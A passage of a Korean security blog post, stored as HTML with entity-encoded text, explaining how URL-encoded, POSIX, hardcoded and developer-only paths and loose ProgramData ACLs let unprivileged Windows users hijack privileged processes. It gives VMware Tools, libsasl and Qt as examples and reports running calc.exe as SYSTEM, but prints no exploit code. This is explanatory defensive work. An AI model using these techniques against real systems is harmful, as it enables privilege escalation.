&#xBC1B;&#xC744; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD558;&#xB294; &#xAC1C;&#xBC1C;&#xC790;&#xC758; &#xB9CE;&#xC740; &#xC2E4;&#xC218;&#xAC00; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;. Windows &#xC751;&#xC6A9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xB2E8;&#xC21C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xACFC; &#xAD00;&#xB828;&#xD558;&#xC5EC; &#xB0B4;&#xAC00; &#xBC1C;&#xACAC;&#xD55C; &#xC2E4;&#xC218;&#xB294; &#xB450; &#xAC00;&#xC9C0; &#xC8FC;&#xC694; &#xBC94;&#xC8FC;&#xB85C; &#xB098;&#xB25C;&#xB2E4;.</p><ol><li>&#xC608;&#xAE30;&#xCE58; &#xC54A;&#xC740; &#xACBD;&#xB85C;&#xC5D0; &#xC561;&#xC138;&#xC2A4;&#xD568;</li><li>&#xC0AC;&#xC6A9; &#xC911;&#xC778; &#xACBD;&#xB85C;&#xC5D0; &#xC608;&#xC0C1;&#xCE58; &#xBABB;&#xD55C; ACL(&#xC561;&#xC138;&#xC2A4; &#xC81C;&#xC5B4; &#xBAA9;&#xB85D;)&#xC774; &#xC801;&#xC6A9;&#xB428;</li></ol><h2 id="&#xC608;&#xAE30;&#xCE58;-&#xC54A;&#xC740;-&#xACBD;&#xB85C;-&#xC561;&#xC138;&#xC2A4;"><a href="#&#xC608;&#xAE30;&#xCE58;-&#xC54A;&#xC740;-&#xACBD;&#xB85C;-&#xC561;&#xC138;&#xC2A4;" class="headerlink" title="&#xC608;&#xAE30;&#xCE58; &#xC54A;&#xC740; &#xACBD;&#xB85C; &#xC561;&#xC138;&#xC2A4;"></a>&#xC608;&#xAE30;&#xCE58; &#xC54A;&#xC740; &#xACBD;&#xB85C; &#xC561;&#xC138;&#xC2A4;</h2><p>&#xACBD;&#xC6B0;&#xC5D0; &#xB530;&#xB77C; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC2E4;&#xD589; &#xC911;&#xC5D0; &#xC608;&#xAE30;&#xCE58; &#xC54A;&#xC740; &#xACBD;&#xB85C;&#xC5D0; &#xC561;&#xC138;&#xC2A4;&#xD55C;&#xB2E4;. &#xC989;, &#xAC1C;&#xBC1C;&#xC790;&#xB294; &#xC774;&#xB7EC;&#xD55C; &#xACBD;&#xB85C;&#xC5D0; &#xC561;&#xC138;&#xC2A4;&#xD558;&#xACE0; &#xC788;&#xB2E4;&#xB294; &#xC0AC;&#xC2E4;&#xC744; &#xC54C;&#xAC8C; &#xB418;&#xBA74; &#xC544;&#xB9C8; &#xB180;&#xB784; &#xAC83;&#xC774;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xC608;&#xAE30;&#xCE58; &#xC54A;&#xC740; &#xACBD;&#xB85C; &#xC561;&#xC138;&#xC2A4;&#xB294; &#xC5EC;&#xB7EC; &#xAC00;&#xC9C0; &#xC774;&#xC720;&#xB85C; &#xC778;&#xD574; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><h3 id="URL-&#xC778;&#xCF54;&#xB529;-&#xACBD;&#xB85C;"><a href="#URL-&#xC778;&#xCF54;&#xB529;-&#xACBD;&#xB85C;" class="headerlink" title="URL &#xC778;&#xCF54;&#xB529; &#xACBD;&#xB85C;"></a>URL &#xC778;&#xCF54;&#xB529; &#xACBD;&#xB85C;</h3><p>&#xC704;&#xC758; &#xC2A4;&#xD06C;&#xB9B0;&#xC0F7;&#xC5D0;&#xC11C; &#xC54C; &#xC218; &#xC788;&#xB4EF;&#xC774; VMware Tools &#xD504;&#xB85C;&#xC138;&#xC2A4; <code>VGAuthService.exe</code>&#xB294; <code>C:\Program%20Files\VMware\VMware%20Tools\VMware%20VGAuth\schemas\xmldsig-core-schema.xsd</code> &#xACBD;&#xB85C;&#xC5D0; &#xC561;&#xC138;&#xC2A4;&#xB97C; &#xC2DC;&#xB3C4;&#xD55C;&#xB2E4;. &#xACF5;&#xBC31;&#xC774; &#xD3EC;&#xD568;&#xB41C; &#xACBD;&#xB85C;&#xAC00; URL&#xB85C; &#xC778;&#xCF54;&#xB529;&#xB41C; &#xACBD;&#xC6B0; &#xD574;&#xB2F9; &#xACF5;&#xBC31;&#xC774; <code>%20</code>&#xC73C;&#xB85C; &#xB300;&#xCCB4;&#xB41C; &#xAC83;&#xC774;&#xB2E4;.</p><p>&#xC774;&#xB7EC;&#xD55C; &#xACB0;&#xACFC;&#xB294; &#xC694;&#xCCAD;&#xB41C; &#xACBD;&#xB85C;&#xAC00; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xC801;&#xC808;&#xD55C; ACL&#xC774; &#xC788;&#xB294; <code>C:\Program Files\</code>&#xC758; &#xD558;&#xC704; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xAC00; &#xC544;&#xB2C8;&#xB77C; &#xB8E8;&#xD2B8; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB97C; &#xBCF4;&#xAE30; &#xC2DC;&#xC791;&#xD55C;&#xB2E4;&#xB294; &#xAC83;&#xC774;&#xB2E4;. Windows &#xC2DC;&#xC2A4;&#xD15C;&#xC740; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xB3C4; &#xC2DC;&#xC2A4;&#xD15C; &#xB8E8;&#xD2B8; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0;&#xC11C; &#xD558;&#xC704; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB97C; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xC73C;&#xBA70; &#xC774;&#xAC83;&#xC740; &#xBC18;&#xBCF5;&#xD574;&#xC11C; &#xB098;&#xC624;&#xB294; &#xC8FC;&#xC694; &#xAC1C;&#xB150;&#xC774; &#xB420; &#xAC83;&#xC774;&#xBBC0;&#xB85C; &#xC774;&#xAC83;&#xC744; &#xAE30;&#xC5B5;&#xD558;&#xC790;.</p><p>&#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xBA85;&#xB839; &#xD504;&#xB86C;&#xD504;&#xD2B8;&#xC5D0;&#xC11C; &#xBB34;&#xC5C7;&#xC744; &#xD560; &#xC218; &#xC788;&#xB294;&#xC9C0; &#xBCF4;&#xC790;:</p><p><img src="/2021/08/18/l0ch/procmon-lpe/Untitled%202.png" alt="Untitled"></p><blockquote><p>&#xB8E8;&#xD2B8; &#xB514;&#xB809;&#xD1A0;&#xB9AC; <code>C:\</code> &#xC5D0;&#xC11C; &#xD558;&#xC704; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; <code>C:\</code> &#xC5D0;&#xC11C; <code>Program%20Files</code> &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB3C4; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p></blockquote><p>&#xD30C;&#xC77C; &#xC561;&#xC138;&#xC2A4;&#xB97C; &#xC120;&#xD0DD;&#xD558;&#xACE0; Ctrl-K&#xB97C; &#xB20C;&#xB7EC; &#xCF5C;&#xC2A4;&#xD0DD;&#xC744; &#xAC00;&#xC838;&#xC634;&#xC73C;&#xB85C;&#xC368; Process Explorer&#xC5D0;&#xC11C; &#xC870;&#xAE08; &#xB354; &#xAE4A;&#xC774; &#xD30C;&#xACE0;&#xB4E4; &#xC218; &#xC788;&#xB2E4;.</p><p><img src="/2021/08/18/l0ch/procmon-lpe/Untitled%203.png" alt="Untitled"></p><p>&#xD30C;&#xC77C; &#xC561;&#xC138;&#xC2A4;&#xAC00; <code>VGAuthService.exe + 0x110d9</code>&#xC5D0; &#xC758;&#xD574; &#xD2B8;&#xB9AC;&#xAC70;&#xB418;&#xACE0; &#xADF8; &#xACFC;&#xC815;&#xC5D0;&#xC11C; <code>xmlLoadExternalEntity()</code>&#xC5D0; &#xB300;&#xD55C; &#xD638;&#xCD9C;&#xC774; &#xC788;&#xC74C;&#xC744; &#xC54C; &#xC218; &#xC788;&#xB2E4;.</p><p>&#xACBD;&#xB85C;&#xAC00; URL&#xB85C; &#xC778;&#xCF54;&#xB529;&#xB418;&#xC5B4; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;  &#xAD8C;&#xD55C; &#xC788;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xACBD;&#xB85C;&#xC758; &#xD30C;&#xC77C;&#xC744; &#xB85C;&#xB4DC;&#xD558;&#xB824;&#xACE0; &#xC2DC;&#xB3C4;&#xD558;&#xAC8C; &#xB41C;&#xB2E4;. &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC774; &#xACBD;&#xB85C;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBBC0;&#xB85C; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xAD8C;&#xD55C;&#xC774; &#xC788;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xC904; &#xC218; &#xC788;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xB41C;&#xB2E4;. &#xC774; &#xACBD;&#xC6B0; &#xACB0;&#xACFC;&#xB294; XXE(XML External Entity) &#xCDE8;&#xC57D;&#xC810;&#xBFD0;&#xC774;&#xC9C0;&#xB9CC; &#xC774;&#xB294; &#xB2E8;&#xC9C0; &#xC6CC;&#xBC0D;&#xC5C5;&#xC5D0; &#xBD88;&#xACFC;&#xD558;&#xB2E4;.</p><h3 id="POSIX-&#xACBD;&#xB85C;"><a href="#POSIX-&#xACBD;&#xB85C;" class="headerlink" title="POSIX &#xACBD;&#xB85C;"></a>POSIX &#xACBD;&#xB85C;</h3><p>&#xC751;&#xC6A9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; Windows &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; POSIX &#xC2A4;&#xD0C0;&#xC77C; &#xACBD;&#xB85C;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xACBD;&#xC6B0; &#xC774; &#xACBD;&#xB85C;&#xB294; Windows &#xC2A4;&#xD0C0;&#xC77C; &#xACBD;&#xB85C;&#xB85C; &#xC815;&#xADDC;&#xD654;&#xB41C;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;, Windows &#xC751;&#xC6A9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC774; <code>/usr/local/</code> &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0; &#xC561;&#xC138;&#xC2A4;&#xD558;&#xB824;&#xACE0; &#xD558;&#xBA74; &#xACBD;&#xB85C;&#xB294; <code>C:\usr\local\</code>&#xB85C; &#xD574;&#xC11D;&#xB418;&#xBA70; &#xC704;&#xC5D0;&#xC11C; &#xC124;&#xBA85;&#xD55C; &#xAC83;&#xACFC; &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xB85C; Windows&#xC5D0;&#xC11C; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xB294; &#xACBD;&#xB85C;&#xC774;&#xB2E4;.</p><p>&#xB2E4;&#xC74C;&#xC740; &#xD328;&#xCE58;&#xB41C; &#xBCF4;&#xC548; &#xC81C;&#xD488;&#xC774; &#xC124;&#xCE58;&#xB41C; &#xC2DC;&#xC2A4;&#xD15C;&#xC758; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBAA8;&#xB2C8;&#xD130; &#xB85C;&#xADF8;&#xB2E4;.</p><p><img src="/2021/08/18/l0ch/procmon-lpe/Untitled%204.png" alt="Untitled"></p><p><code>openssl.cnf</code>&#xB97C; &#xD1B5;&#xD574; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xAE30; &#xC704;&#xD574; &#xACF5;&#xAC1C;&#xC801;&#xC73C;&#xB85C; &#xC54C;&#xB824;&#xC9C4; &#xAE30;&#xC220;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC81C;&#xD55C;&#xB41C; &#xC0AC;&#xC6A9;&#xC790; &#xACC4;&#xC815;&#xC5D0;&#xC11C; SYSTEM &#xAD8C;&#xD55C;&#xC73C;&#xB85C; <code>calc.exe</code>&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xC5EC; code execution&#xC744; &#xC2DC;&#xC5F0;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><p><img src="/2021/08/18/l0ch/procmon-lpe/Untitled%205.png" alt="Untitled"></p><h3 id="&#xC608;&#xC0C1;&#xCE58;-&#xBABB;&#xD55C;-&#xACBD;&#xB85C;&#xC5D0;&#xC11C;-&#xB85C;&#xB4DC;&#xB418;&#xB294;-&#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;-&#xC0AC;&#xC6A9;"><a href="#&#xC608;&#xC0C1;&#xCE58;-&#xBABB;&#xD55C;-&#xACBD;&#xB85C;&#xC5D0;&#xC11C;-&#xB85C;&#xB4DC;&#xB418;&#xB294;-&#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;-&#xC0AC;&#xC6A9;" class="headerlink" title="&#xC608;&#xC0C1;&#xCE58; &#xBABB;&#xD55C; &#xACBD;&#xB85C;&#xC5D0;&#xC11C; &#xB85C;&#xB4DC;&#xB418;&#xB294; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xC0AC;&#xC6A9;"></a>&#xC608;&#xC0C1;&#xCE58; &#xBABB;&#xD55C; &#xACBD;&#xB85C;&#xC5D0;&#xC11C; &#xB85C;&#xB4DC;&#xB418;&#xB294; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC; &#xC0AC;&#xC6A9;</h3><p>&#xACBD;&#xC6B0;&#xC5D0; &#xB530;&#xB77C; &#xAC1C;&#xBC1C;&#xC790;&#xAC00; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; Windows &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xC744; &#xC218; &#xC788;&#xB294; &#xC704;&#xCE58;&#xC5D0;&#xC11C; &#xB85C;&#xB4DC;&#xB41C; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xB3C4; &#xC788;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; &#xB2E4;&#xC74C;&#xC740; <code>C:\CMU\bin\sasl2</code> &#xACBD;&#xB85C;&#xC5D0; &#xC561;&#xC138;&#xC2A4;&#xB97C; &#xC2DC;&#xB3C4;&#xD558;&#xB294; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC758; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBAA8;&#xB2C8;&#xD130; &#xB85C;&#xADF8;&#xC774;&#xB2E4;.</p><p><img src="/2021/08/18/l0ch/procmon-lpe/Untitled%206.png" alt="Untitled"></p><p>&#xCF5C;&#xC2A4;&#xD0DD;&#xC744; &#xBCF4;&#xBA74; &#xC774; &#xC561;&#xC138;&#xC2A4;&#xAC00; <code>libsasl.dll</code> &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xC5D0; &#xC758;&#xD574; &#xD2B8;&#xB9AC;&#xAC70;&#xB418;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xB2E4;.</p><p><img src="/2021/08/18/l0ch/procmon-lpe/Untitled%207.png" alt="Untitled"></p><p><code>libsasl.dll</code>&#xC5D0; &#xB300;&#xD55C; &#xCF54;&#xB4DC;&#xB97C; &#xBCF4;&#xBA74; <strong>[C:\CMU\bin\sasl2</strong> &#xACBD;&#xB85C;&#xC5D0; &#xB300;&#xD55C; &#xD558;&#xB4DC; &#xCF54;&#xB529;&#xB41C; &#xCC38;&#xC870;&#xB97C;](<a href="https://github.com/cyrusimap/cyrus-sasl/blob/eeb935a9198172aede242c77b0e0dafe9312db10/win32/include/config.h#L117">https://github.com/cyrusimap/cyrus-sasl/blob/eeb935a9198172aede242c77b0e0dafe9312db10/win32/include/config.h#L117</a>)  &#xBCFC; &#xC218; &#xC788;&#xB2E4;.</p><p>&#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xB294; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB97C; &#xB9CC;&#xB4E4;&#xACE0; &#xAC70;&#xAE30;&#xC5D0; &#xC6D0;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xBC30;&#xCE58;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70; &#xBAA8;&#xB4E0; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790; &#xACC4;&#xC815;&#xC5D0;&#xC11C; SYSTEM &#xAD8C;&#xD55C;&#xC73C;&#xB85C; <code>calc.exe</code>&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><p><img src="/2021/08/18/l0ch/procmon-lpe/Untitled%208.png" alt="Untitled"></p><h3 id="&#xAC1C;&#xBC1C;&#xC790;-&#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xB9CC;-&#xC874;&#xC7AC;&#xD558;&#xB294;-&#xACBD;&#xB85C;-&#xC0AC;&#xC6A9;"><a href="#&#xAC1C;&#xBC1C;&#xC790;-&#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xB9CC;-&#xC874;&#xC7AC;&#xD558;&#xB294;-&#xACBD;&#xB85C;-&#xC0AC;&#xC6A9;" class="headerlink" title="&#xAC1C;&#xBC1C;&#xC790; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xB9CC; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xACBD;&#xB85C; &#xC0AC;&#xC6A9;"></a>&#xAC1C;&#xBC1C;&#xC790; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xB9CC; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xACBD;&#xB85C; &#xC0AC;&#xC6A9;</h3><p>&#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; &#xAC1C;&#xBC1C;&#xC790;&#xC758; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xB9CC; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xACBD;&#xB85C;&#xC5D0; &#xB300;&#xD55C; &#xCC38;&#xC870;&#xB97C; &#xD3EC;&#xD568;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xD574;&#xB2F9; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xAC00; &#xC5C6;&#xB294; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xAC00; &#xC81C;&#xB300;&#xB85C; &#xC791;&#xB3D9;&#xD558;&#xACE0; &#xB204;&#xAD70;&#xAC00;&#xAC00; &#xCC3E;&#xC9C0; &#xC54A;&#xB294; &#xD55C; &#xC774; &#xC18D;&#xC131;&#xC740; &#xBC1C;&#xACAC;&#xB418;&#xC9C0; &#xC54A;&#xC744; &#xC218; &#xC788;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;, &#xC774; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB294; <code>C:\Qt\</code> &#xB514;&#xB809;&#xD1A0;&#xB9AC; &#xC5D0;&#xC11C; <code>plugins</code> &#xD558;&#xC704; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB97C; &#xCC3E;&#xB294;&#xB2E4;.</p><p><img src="/2021/08/18/l0ch/procmon-lpe/Untitled%209.png" alt="Untitled"></p><p>&#xBA87; &#xAC00;&#xC9C0; &#xB2E8;&#xACC4;&#xB97C; &#xAC74;&#xB108;&#xB6F8; &#xAC83;&#xC774;&#xC9C0;&#xB9CC; &#xC801;&#xC808;&#xD55C; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB97C; &#xBC30;&#xCE58;&#xD574; code execution&#xC744; &#xB2EC;&#xC131;&#xD560; &#xC218; &#xC788;&#xC74C;&#xC744; &#xC54C; &#xC218; &#xC788;&#xB2E4;.</p><p><img src="/2021/08/18/l0ch/procmon-lpe/Untitled%2010.png" alt="Untitled"></p><p>Qt &#xAC1C;&#xBC1C; &#xD50C;&#xB7AB;&#xD3FC;&#xC744; &#xC790;&#xC138;&#xD788; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74; &#xC774;&#xB7EC;&#xD55C; &#xC720;&#xD615;&#xC758; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC798; &#xC54C;&#xB824;&#xC9C4; &#xBB38;&#xC81C;&#xB2E4;. &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; 5&#xB144; &#xC804;&#xC5D0; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC9C0;&#xB9CC; CVE&#xB97C; &#xBC1B;&#xC9C0; &#xBABB;&#xD588;&#xC73C;&#xBA70; &#xD574;&#xB2F9; &#xD328;&#xCE58;&#xAC00; &#xB3C4;&#xC785;&#xB418;&#xAE30; &#xC774;&#xC804;&#xC758; Qt &#xBC84;&#xC804;&#xC73C;&#xB85C; &#xAD6C;&#xCD95;&#xB418;&#xC5C8;&#xAC70;&#xB098; &#xAC1C;&#xBC1C;&#xC790;&#xAC00; <code>Qt5core.dll</code>&#xC5D0; &#xC800;&#xC7A5;&#xB41C; <code>qt_prfxpath</code> &#xAC12;&#xC744; &#xD328;&#xCE58;&#xD558;&#xAE30; &#xC704;&#xD574; <code>windeployqt</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xACBD;&#xC6B0; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xAC00; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC5D0; &#xCDE8;&#xC57D;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><h2 id="&#xC0AC;&#xC6A9;-&#xC911;&#xC778;-&#xACBD;&#xB85C;&#xC5D0;-&#xC608;&#xAE30;&#xCE58;-&#xC54A;&#xC740;-ACL&#xC774;-&#xC801;&#xC6A9;&#xB428;"><a href="#&#xC0AC;&#xC6A9;-&#xC911;&#xC778;-&#xACBD;&#xB85C;&#xC5D0;-&#xC608;&#xAE30;&#xCE58;-&#xC54A;&#xC740;-ACL&#xC774;-&#xC801;&#xC6A9;&#xB428;" class="headerlink" title="&#xC0AC;&#xC6A9; &#xC911;&#xC778; &#xACBD;&#xB85C;&#xC5D0; &#xC608;&#xAE30;&#xCE58; &#xC54A;&#xC740; ACL&#xC774; &#xC801;&#xC6A9;&#xB428;"></a>&#xC0AC;&#xC6A9; &#xC911;&#xC778; &#xACBD;&#xB85C;&#xC5D0; &#xC608;&#xAE30;&#xCE58; &#xC54A;&#xC740; ACL&#xC774; &#xC801;&#xC6A9;&#xB428;</h2><p>&#xC751;&#xC6A9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C; &#xC608;&#xAE30;&#xCE58; &#xC54A;&#xC740; &#xACBD;&#xB85C;&#xC5D0; &#xC561;&#xC138;&#xC2A4;&#xD558;&#xB294; &#xB300;&#xBD80;&#xBD84;&#xC758; &#xACBD;&#xC6B0;&#xB294; &#xC0AC;&#xC2E4; &#xB2E8;&#xC21C;&#xD55C; &#xACF3;&#xC5D0; &#xC6D0;&#xC778;&#xC774; &#xC788;&#xB2E4;. &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xB294; Windows &#xC2DC;&#xC2A4;&#xD15C; &#xB8E8;&#xD2B8; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0;&#xC11C; &#xD558;&#xC704; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB97C; &#xB9CC;&#xB4E4; &#xC218; &#xC788;&#xB2E4;. ACL&#xC744; &#xC801;&#xC808;&#xD558;&#xAC8C; &#xC124;&#xC815;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xB294; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB97C; &#xCC3E;&#xC73C;&#xB824;&#xBA74; &#xC870;&#xAE08; &#xB354; &#xC870;&#xC0AC;&#xD574;&#xC57C; &#xD55C;&#xB2E4;.</p><p>Windows &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xC640; &#xAD00;&#xB828;&#xB41C; &#xB300;&#xBD80;&#xBD84;&#xC758; ACL &#xBB38;&#xC81C;&#xB294; &#xD55C; &#xAC00;&#xC9C0; &#xAC1C;&#xB150;&#xACFC; &#xAD00;&#xB828;&#xC774; &#xC788;&#xB2E4;.<br><code>C:\Program Files\</code> &#xB610;&#xB294; <code>C:\Program Files (x86)\</code>&#xC758; &#xD558;&#xC704; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB294; &#xC0C1;&#xC18D;&#xC744; &#xD1B5;&#xD574; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xBCF4;&#xC548; ACL&#xC744; &#xAC16;&#xB294;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xB97C; <code>C:\Program Files\WD\</code>&#xC5D0; &#xC124;&#xCE58;&#xD558;&#xB294; &#xACBD;&#xC6B0;, &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xB294; <code>C:\Program Files\</code>&#xC758; &#xC0C1;&#xC704; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC4F8; &#xC218; &#xC5C6;&#xACE0; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; <code>WD</code> &#xD558;&#xC704; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xAC00; &#xC0C1;&#xC704; &#xAD8C;&#xD55C;&#xC744; &#xC0C1;&#xC18D;&#xD558;&#xBBC0;&#xB85C; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xB294; <code>WD</code> &#xD558;&#xC704; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xC218;&#xC815;&#xD560; &#xC218; &#xC5C6;&#xB2E4;.</p><h3 id="ACL&#xC744;-&#xBA85;&#xC2DC;&#xC801;&#xC73C;&#xB85C;-&#xC124;&#xC815;&#xD558;&#xC9C0;-&#xC54A;&#xACE0;-C-ProgramData-&#xB514;&#xB809;&#xD1A0;&#xB9AC;-&#xC0AC;&#xC6A9;"><a href="#ACL&#xC744;-&#xBA85;&#xC2DC;&#xC801;&#xC73C;&#xB85C;-&#xC124;&#xC815;&#xD558;&#xC9C0;-&#xC54A;&#xACE0;-C-ProgramData-&#xB514;&#xB809;&#xD1A0;&#xB9AC;-&#xC0AC;&#xC6A9;" class="headerlink" title="ACL&#xC744; &#xBA85;&#xC2DC;&#xC801;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD558;&#xC9C0; &#xC54A;&#xACE0; C:\ProgramData\ &#xB514;&#xB809;&#xD1A0;&#xB9AC; &#xC0AC;&#xC6A9;"></a>ACL&#xC744; &#xBA85;&#xC2DC;&#xC801;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD558;&#xC9C0; &#xC54A;&#xACE0; C:\ProgramData\ &#xB514;&#xB809;&#xD1A0;&#xB9AC; &#xC0AC;&#xC6A9;</h3><p><code>ProgramData</code> &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB294; &#xC758;&#xB3C4;&#xC801;&#xC73C;&#xB85C; &#xC0C1;&#xC2B9;&#xB41C; &#xAD8C;&#xD55C; &#xC5C6;&#xC774; &#xC4F8; &#xC218; &#xC788;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; <code>ProgramData</code> &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0; &#xC0DD;&#xC131;&#xB41C; &#xBAA8;&#xB4E0; &#xD558;&#xC704; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB294; &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC4F8; 